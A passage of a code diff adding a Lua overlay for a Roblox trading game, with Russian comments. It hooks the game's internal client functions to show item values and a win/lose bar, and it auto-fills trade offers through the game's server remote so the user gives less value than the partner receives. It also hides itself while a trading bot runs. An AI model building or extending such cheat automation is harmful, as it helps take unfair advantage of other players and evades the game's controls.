+diffLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+diffLabel.Font = Enum.Font.GothamBold
+diffLabel.TextScaled = true
+diffLabel.ZIndex = 3
+diffLabel.Parent = barContainer
+
+local diffCorner = Instance.new("UICorner")
+diffCorner.CornerRadius = UDim.new(1, 0)
+diffCorner.Parent = diffLabel
+
+local pointer = Instance.new("Frame")
+pointer.Name = "Pointer"
+pointer.AnchorPoint = Vector2.new(0.5, 0)
+pointer.Position = UDim2.new(0.5, 0, 1, 2)
+pointer.Size = UDim2.new(0, 4, 0, 14)
+pointer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+pointer.BorderSizePixel = 0
+pointer.Parent = mainFrame
+
+local CrashBar = {}
+
+-- Категории результата по ratio = myTotal / (myTotal + partnerTotal)
+-- Чем меньше ratio — тем лучше для тебя (ты отдаёшь меньше)
+local RESULT_CATEGORIES = {
+	{ max = 0.45, label = "WIN",       bg = Color3.fromRGB(39, 174, 96),   fill = Color3.fromRGB(30, 150, 80)   },
+	{ max = 0.49, label = "SMALL WIN", bg = Color3.fromRGB(88, 214, 141),  fill = Color3.fromRGB(60, 190, 110)  },
+	{ max = 0.51, label = "FAIR",      bg = Color3.fromRGB(155, 89, 182),  fill = Color3.fromRGB(130, 60, 160)  },
+	{ max = 0.55, label = "MINI LOSE", bg = Color3.fromRGB(230, 126, 34),  fill = Color3.fromRGB(200, 100, 20)  },
+	{ max = 1.01, label = "LOSE",      bg = Color3.fromRGB(231, 76, 60),   fill = Color3.fromRGB(192, 57, 43)   },
+}
+
+function CrashBar.SetCategory(ratio)
+	local cat = RESULT_CATEGORIES[#RESULT_CATEGORIES] -- дефолт — LOSE
+	for _, c in ipairs(RESULT_CATEGORIES) do
+		if ratio < c.max then
+			cat = c
+			break
+		end
+	end
+	resultLabel.Text              = cat.label
+	barContainer.BackgroundColor3 = cat.bg
+	barFill.BackgroundColor3      = cat.fill
+	diffLabel.BackgroundColor3    = cat.fill
+end
+
+function CrashBar.SetFillRatio(ratio)
+	ratio = math.clamp(ratio, 0, 1)
+	TweenService:Create(barFill, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
+		Size = UDim2.new(ratio, 0, 1, 0),
+	}):Play()
+end
+
+function CrashBar.Update(myTotal, partnerTotal)
+	myTotal     = myTotal or 0
+	partnerTotal = partnerTotal or 0
+
+	leftValue.Text  = string.format("%.2f", myTotal)
+	rightValue.Text = string.format("%.2f", partnerTotal)
+
+	local diff = myTotal - partnerTotal
+	local sign = diff >= 0 and "+" or ""
+	diffLabel.Text = sign .. string.format("%.2f", diff)
+
+	local sum = myTotal + partnerTotal
+	local ratio = sum > 0 and (myTotal / sum) or 0.5
+
+	CrashBar.SetCategory(ratio)
+	CrashBar.SetFillRatio(ratio)
+end
+
+local function findLabelParent(frame)
+	if typeof(frame) ~= "Instance" then
+		return nil
+	end
+
+	local button = frame:FindFirstChild("Button", true)
+	if button then
+		return button
+	end
+
+	return frame:FindFirstChildWhichIsA("GuiButton", true) or frame
+end
+
+local function attachValueLabel(frame, data)
+	if typeof(frame) ~= "Instance" or not data then
+		return
+	end
+
+	local item_data = data.item_data
+	if not item_data and data.kind then
+		item_data = data
+	end
+	if not item_data then
+		return
+	end
+
+	local category = item_data.category or data.category
+	if not category then
+		return
+	end
+
+	local parent = findLabelParent(frame)
+	if category == "food" then
+		parent = frame
+	end
+	if not parent then
+		return
+	end
+
+	local kind = resolveKind(item_data)
+	local v = 0
+	local valOk, valResult = pcall(function()
+		return Values.val(kind, item_data.properties, category, item_data)
+	end)
+	if valOk and type(valResult) == "number" then
+		v = valResult
+	end
+
+	local existing = parent:FindFirstChild("AmvggValue", true)
+	if existing then
+		existing:Destroy()
+	end
+
+	local label = Instance.new("TextLabel")
+	label.Name = "AmvggValue"
+	label.Size = UDim2.new(1.5, 0, 0, 20)
+	label.Position = category == "food"
+		and UDim2.new(-0.25, 0, 0, -4)
+		or UDim2.new(-0.25, 0, 0, 3)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.fromRGB(255, 255, 255)
+	label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	label.TextStrokeTransparency = 0
+	label.TextSize = 11
+	label.Font = Enum.Font.GothamBold
+	label.TextXAlignment = Enum.TextXAlignment.Center
+	label.TextYAlignment = Enum.TextYAlignment.Top
+	label.ZIndex = math.max(parent.ZIndex + 10, 25)
+	label.ClipsDescendants = false
+	label.Text = FormatValue(v)
+	label.Parent = parent
+end
+
+local CREATOR_RENDER_METHODS = { "item", "pet" }
+local hookedCreatorFns = {}
+
+local function hookCreatorMethod(creator, methodName)
+	local original = creator[methodName]
+	if type(original) ~= "function" then
+		return
+	end
+
+	local wrapped = hookedCreatorFns[original]
+	if not wrapped then
+		wrapped = function(self, data, ...)
+			local results = table.pack(original(self, data, ...))
+			if data and (data.item_data or data.kind) and typeof(results[1]) == "Instance" then
+				pcall(attachValueLabel, results[1], data)
+			end
+			return table.unpack(results, 1, results.n)
+		end
+		hookedCreatorFns[original] = wrapped
+	end
+
+	creator[methodName] = wrapped
+end
+
+local function hookBackpackCreators()
+	local seen = {}
+	local creators = { BackpackButtonCreator }
+	if BackpackApp and BackpackApp.button_creator then
+		table.insert(creators, BackpackApp.button_creator)
+	end
+
+	for _, creator in ipairs(creators) do
+		if creator and not seen[creator] then
+			seen[creator] = true
+			for _, methodName in ipairs(CREATOR_RENDER_METHODS) do
+				hookCreatorMethod(creator, methodName)
+			end
+		end
+	end
+end
+
+local function findButtonFrame(btnData)
+	if not btnData then
+		return nil
+	end
+
+	if typeof(btnData.frame) == "Instance" then
+		return btnData.frame
+	end
+	if typeof(btnData.button) == "Instance" then
+		return btnData.button
+	end
+
+	local unique = btnData.unique or (btnData.item_data and btnData.item_data.unique)
+	local hash = btnData.hash
+	if not BackpackApp then
+		return nil
+	end
+
+	local roots = { BackpackApp.scroll, BackpackApp.content }
+	for _, root in ipairs(roots) do
+		if root then
+			for _, key in ipairs({ unique, hash, unique and tostring(unique), hash and tostring(hash) }) do
+				if key then
+					local found = root:FindFirstChild(key, true)
+					if found then
+						return found
+					end
+				end
+			end
+		end
+	end
+
+	return nil
+end
+
+local function labelAllBackpackButtons()
+	if not BackpackApp or type(BackpackApp.button_by_unique) ~= "table" then
+		return
+	end
+
+	for _, btnData in pairs(BackpackApp.button_by_unique) do
+		local item_data = btnData.item_data or (btnData.kind and btnData)
+		if item_data then
+			local frame = findButtonFrame(btnData)
+			if frame then
+				pcall(attachValueLabel, frame, btnData)
+			end
+		end
+	end
+end
+
+hookBackpackCreators()
+
+if BackpackApp then
+	local originalRender = BackpackApp._render_category_async
+	if type(originalRender) == "function" then
+		BackpackApp._render_category_async = function(self, ...)
+			local results = table.pack(originalRender(self, ...))
+			task.defer(labelAllBackpackButtons)
+			return table.unpack(results, 1, results.n)
+		end
+	end
+end
+
+function CrashBar.Refresh()
+	local ok, myTotal, partnerTotal = pcall(function()
+		local _, my = Values.GetItemsFromMyOffer()
+		local _, partner = Values.GetItemsFromPartnerOffer()
+		return my, partner
+	end)
+	if not ok then
+		myTotal, partnerTotal = 0, 0
+	end
+	CrashBar.Update(myTotal or 0, partnerTotal or 0)
+	return myTotal or 0, partnerTotal or 0
+end
+
+refreshBar = function()
+	CrashBar.Refresh()
+end
+
+CrashBar.Update(0, 0)
+
+task.spawn(function()
+	while true do
+		-- Скрываем оверлей пока бот-скрипт ведёт автоматический трейд
+		if _G.am_bot_trading then
+			screenGui.Enabled = false
+		elseif TradeApp.instance.Frame.Visible == true then
+			screenGui.Enabled = true
+		else
+			screenGui.Enabled = false
+		end
+		wait(0.1)
+	end
+end)
+
+local original4 = TradeApp.refresh_all
+TradeApp.refresh_all = function(...)
+	local results = {original4(...)}
+	local refreshOk, refreshErr = pcall(CrashBar.Refresh)
+	return table.unpack(results)
+end
+if BackpackApp then
+	BackpackApp:refresh_rendered_items()
+end
+
+
+-- =============================================
+-- AUTO FILL OFFER — отдельное draggable окно
+-- =============================================
+
+local RouterClient = load("RouterClient")
+
+-- Отдельный ScreenGui для панели авто-оффера
+local sideGui = Instance.new("ScreenGui")
+sideGui.Name = "AutoFillGui"
+sideGui.ResetOnSpawn = false
+sideGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+sideGui.Parent = player:WaitForChild("PlayerGui")
+
+local sideFrame = Instance.new("Frame")
+sideFrame.Name = "AutoFillFrame"
+sideFrame.AnchorPoint = Vector2.new(0, 0)
+sideFrame.Position = UDim2.new(0, 10, 0.5, -80)
+sideFrame.Size = UDim2.new(0, 270, 0, 148)
+sideFrame.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+sideFrame.BorderSizePixel = 0
+sideFrame.Active = true
+sideFrame.Parent = sideGui
+
+local sideCorner = Instance.new("UICorner")
+sideCorner.CornerRadius = UDim.new(0, 14)
+sideCorner.Parent = sideFrame
+
+-- Drag для sideFrame
+local sideDragging, sideDragStart, sideStartPos = false, nil, nil
+sideFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+		sideDragging = true
+		sideDragStart = input.Position
+		sideStartPos = sideFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				sideDragging = false
+			end
+		end)
+	end
+end)
+UserInputService.InputChanged:Connect(function(input)
+	if sideDragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - sideDragStart
+		sideFrame.Position = UDim2.new(
+			sideStartPos.X.Scale, sideStartPos.X.Offset + delta.X,
+			sideStartPos.Y.Scale, sideStartPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- Заголовок
+local sideTitle = Instance.new("TextLabel")
+sideTitle.BackgroundTransparency = 1
+sideTitle.Position = UDim2.new(0, 8, 0, 6)
+sideTitle.Size = UDim2.new(1, -16, 0, 20)
+sideTitle.Text = "⚡ Авто-подбор оффера"
+sideTitle.TextColor3 = Color3.fromRGB(30, 30, 30)
+sideTitle.Font = Enum.Font.GothamBold
+sideTitle.TextSize = 13
+sideTitle.TextXAlignment = Enum.TextXAlignment.Left
+sideTitle.Parent = sideFrame
+
+-- Строка кнопок (2×2)
+local FILL_TARGETS = {
+	win       = { ratio = 0.78, label = "WIN",    color = Color3.fromRGB(39, 174, 96)  },
+	small_win = { ratio = 0.91, label = "SM.WIN", color = Color3.fromRGB(52, 195, 120) },
+	fair      = { ratio = 1.00, label = "FAIR",   color = Color3.fromRGB(52, 152, 219) },
+	mini_lose = { ratio = 1.10, label = "M.LOSE", color = Color3.fromRGB(230, 126, 34) },
+}
+local fillOrder = { "win", "small_win", "fair", "mini_lose" }
+
+local BTN_W = 124
+local BTN_H = 32
+local BTN_PAD = 4
+
+for i, key in ipairs(fillOrder) do
+	local cfg = FILL_TARGETS[key]
+	local col = (i - 1) % 2        -- 0 или 1
+	local row = math.floor((i-1)/2) -- 0 или 1
+	local xOff = 8 + col * (BTN_W + BTN_PAD)
+	local yOff = 30 + row * (BTN_H + BTN_PAD)
+
+	local btn = Instance.new("TextButton")
+	btn.Name = "Fill_" .. key
+	btn.Position = UDim2.new(0, xOff, 0, yOff)
+	btn.Size = UDim2.new(0, BTN_W, 0, BTN_H)
+	btn.BackgroundColor3 = cfg.color
+	btn.AutoButtonColor = false
+	btn.Text = cfg.label
+	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 14
+	btn.Parent = sideFrame
+
+	local bCorner = Instance.new("UICorner")
+	bCorner.CornerRadius = UDim.new(0, 8)
+	bCorner.Parent = btn
+
+	btn.MouseEnter:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.1), {
+			BackgroundColor3 = cfg.color:Lerp(Color3.fromRGB(255,255,255), 0.18)
+		}):Play()
+	end)
+	btn.MouseLeave:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.1), {
+			BackgroundColor3 = cfg.color
+		}):Play()
+	end)
+	btn.MouseButton1Click:Connect(function()
+		_G.doAutoFill(key)
+	end)
+end
+
+-- Статус
+local sideStatus = Instance.new("TextLabel")
+sideStatus.Name = "SideStatus"
+sideStatus.BackgroundTransparency = 1
+sideStatus.Position = UDim2.new(0, 8, 0, 108)
+sideStatus.Size = UDim2.new(1, -16, 0, 34)
+sideStatus.Text = "Нажми кнопку для авто-заполнения"
+sideStatus.TextColor3 = Color3.fromRGB(40, 40, 40)
+sideStatus.Font = Enum.Font.Gotham
+sideStatus.TextSize = 11
+sideStatus.TextWrapped = true
+sideStatus.TextXAlignment = Enum.TextXAlignment.Left
+sideStatus.Parent = sideFrame
+
+-- Показываем только когда трейд открыт И бот не торгует сам
+task.spawn(function()
+	while true do
+		local ok, vis = pcall(function()
+			return TradeApp.instance.Frame.Visible
+		end)
+		sideGui.Enabled = ok and vis == true and not _G.am_bot_trading
+		task.wait(0.15)
+	end
+end)
+
+local function setSideStatus(text, color)
+	sideStatus.Text = text
+	sideStatus.TextColor3 = color or Color3.fromRGB(40, 40, 40)
+end
+
+-- =============================================
+-- ЛОГИКА АВТО-ЗАПОЛНЕНИЯ
+-- =============================================
+
+local function getMyInventoryItems()
+	local items = {}
+	if not BackpackApp or type(BackpackApp.button_by_unique) ~= "table" then
+		return items
+	end
+	for uniqueKey, btnData in pairs(BackpackApp.button_by_unique) do
+		local item_data = btnData.item_data or (btnData.kind and btnData) or nil
+		if item_data then
+			local category = item_data.category
+			if category then
+				local kind = resolveKind(item_data)
+				local v = 0
+				pcall(function()
+					v = Values.val(kind, item_data.properties, category, item_data)
+				end)
+				if v > 0 then
+					local uid = item_data.unique or uniqueKey
+					table.insert(items, {
+						unique   = uid,
+						kind     = kind,
+						value    = v,
+						category = category,
+					})
+				end
+			end
+		end
+	end
+	return items
+end
+
+local function getMyOfferUniqueSet()
+	local set = {}
+	local ok, offer = pcall(function() return TradeApp:_get_my_offer() end)
+	if ok and offer and type(offer.items) == "table" then
+		for _, it in ipairs(offer.items) do
+			if it.unique then set[it.unique] = true end
+		end
+	end
+	return set
+end
+
+-- Жадный подбор предметов к целевой сумме
+local function greedySelect(items, target, overshootPct)
+	overshootPct = overshootPct or 0.14
+	table.sort(items, function(a, b) return a.value > b.value end)
+	local selected, total = {}, 0
+	for _, item in ipairs(items) do
+		if #selected >= 18 then break end
+		if total >= target then break end
+		if (total + item.value) <= target * (1 + overshootPct) then
+			table.insert(selected, item)
+			total = total + item.value
+		end
+	end
+	return selected, total
+end
+
+local autoFillBusy = false
+
+function _G.doAutoFill(mode)
+	if autoFillBusy then
+		setSideStatus("Подождите, идёт заполнение...", Color3.fromRGB(200, 150, 30))
+		return
+	end
+	autoFillBusy = true
+
+	task.spawn(function()
+		-- Принудительный refresh перед расчётом
+		pcall(function() TradeApp:refresh_all() end)
+		task.wait(0.25)
+
+		local _, partnerTotal = Values.GetItemsFromPartnerOffer()
+		partnerTotal = partnerTotal or 0
+
+		if partnerTotal <= 0 then
+			setSideStatus("Партнёр не добавил предметы!", Color3.fromRGB(200, 60, 60))
+			autoFillBusy = false
+			return
+		end
+
+		local cfg = FILL_TARGETS[mode]
+		local targetValue = partnerTotal * cfg.ratio
+
+		setSideStatus(
+			string.format("Партнёр: %.2f → Цель: %.2f [%s]", partnerTotal, targetValue, cfg.label),
+			Color3.fromRGB(50, 50, 50)
+		)
+
+		-- Снимаем текущие предметы через официальный метод TradeApp
+		-- (он обновляет локальный стейт и не вызывает ресинк-баги)
+		local ok2, myOffer = pcall(function() return TradeApp:_get_my_offer() end)
+		if ok2 and myOffer and type(myOffer.items) == "table" and #myOffer.items > 0 then
+			local toRemove = {}
+			for _, it in ipairs(myOffer.items) do
+				table.insert(toRemove, it)
+			end
+			for _, it in ipairs(toRemove) do
+				pcall(function()
+					TradeApp:_remove_item_from_my_offer(it)
+				end)
+				task.wait(0.12)
+			end
+			task.wait(0.25)
+		end
+
+		-- Берём предметы из инвентаря (ВСЕ категории)
+		local allItems = getMyInventoryItems()
+		local inOffer  = getMyOfferUniqueSet()
+		local available = {}
+		for _, item in ipairs(allItems) do
+			if not inOffer[item.unique] then
+				table.insert(available, item)
+			end
+		end
+
+		if #available == 0 then
+			setSideStatus("Нет предметов с известной ценностью!", Color3.fromRGB(200, 60, 60))
+			autoFillBusy = false
+			return
+		end
+
+		local selected, myTotal = greedySelect(available, targetValue)
+
+		if #selected == 0 then
+			setSideStatus(string.format("Нет подходящих под %.2f", targetValue), Color3.fromRGB(200, 60, 60))
+			autoFillBusy = false
+			return
+		end
+
+		-- Добавляем предметы с паузами (чтобы сервер успевал обрабатывать)
+		local addedCount = 0
+		for _, item in ipairs(selected) do
+			local ok3 = pcall(function()
+				RouterClient.get("TradeAPI/AddItemToOffer"):FireServer(item.unique)
+			end)
+			if ok3 then addedCount += 1 end
+			task.wait(0.12)
+		end
+
+		-- Финальный refresh
+		task.wait(0.3)
+		pcall(function() TradeApp:refresh_all() end)
+		task.wait(0.15)
+		CrashBar.Refresh()
+
+		setSideStatus(
+			string.format("✓ [%s] %d пред. | мой: %.2f / партнёр: %.2f",
+				cfg.label, addedCount, myTotal, partnerTotal),
+			Color3.fromRGB(30, 140, 60)
+		)
+		task.delay(5, function()
+			setSideStatus("Нажми кнопку для авто-заполнения")
+		end)
+
+		autoFillBusy = false
+	end)
+end
